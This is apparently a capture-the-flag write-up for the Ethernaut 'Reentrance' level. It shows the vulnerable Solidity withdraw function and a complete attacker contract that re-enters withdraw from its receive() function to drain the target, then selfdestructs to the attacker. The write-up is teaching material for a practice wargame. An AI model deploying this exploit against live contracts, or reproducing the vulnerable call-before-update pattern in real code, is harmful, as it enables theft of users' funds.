# Ethernaut #10 - Reentrance

**Goal**
The goal of this level is for you to steal all the funds from the contract.


```solidity
function withdraw(uint256 _amount) public {
    // check
        if (balances[msg.sender] >= _amount) {
            // Interaction
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            // Effect
            unchecked {
                balances[msg.sender] -= _amount;
            }
        }
}
```

In the above code the check is done first and then the interaction is done and then the effect is done. 

Which is a classic example of reentrancy attack.

To exploit this we can create a contract that will call the withdraw function recursively.

```solidity
contract ReentranceAttacker {
    Reentrance public reentrance;
    uint256 public attackAmount;

    constructor(address payable _reentrance) {
        reentrance = Reentrance(_reentrance);
    }

    function attack() public payable {
        attackAmount = msg.value;
        // donate to get balance
        reentrance.donate{value: attackAmount}(address(this));
        // withdraw to trigger reentrancy
        reentrance.withdraw(attackAmount);

        require(address(reentrance).balance == 0, "Withdraw failed");
        selfdestruct(payable(address(msg.sender)));
    }

    // keep draining on every ETH receive
    receive() external payable {
        uint256 amount = min(1 ether, address(reentrance).balance);
        if (amount > 0) {
            reentrance.withdraw(amount);
        }
    }

    function min(uint256 a, uint256 b) public pure returns (uint256) {
        return a < b ? a : b;
    }
}
```

If we see the attack contract the contract donates an amount to the reentrance contract and then calls the withdraw function. After that the receive is triggered and the withdraw is called again. This happens recursively until the reentrance contract is empty.After the reentrance contract is empty the attack contract will selfdestruct and send all the funds to the attacker.